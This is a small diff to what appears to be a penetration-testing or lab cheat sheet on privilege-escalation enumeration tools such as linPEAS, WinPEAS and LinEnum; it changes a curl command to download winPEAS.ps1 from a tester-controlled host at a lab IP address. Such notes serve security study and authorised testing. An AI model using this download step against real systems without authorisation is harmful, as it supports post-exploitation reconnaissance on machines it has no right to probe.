@@ -13,7 +13,7 @@ https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
 WinPEAS can be found [here](https://github.com/carlospolop/PEASS-ng/releases)
 ```powershell
-curl -o winPEAS.ps1 http://example.com/winPEAS.ps1
+curl -o winPEAS.ps1 http://10.10.14.40:8000/winPEAS.ps1
 ```
 
 ### LinEnum
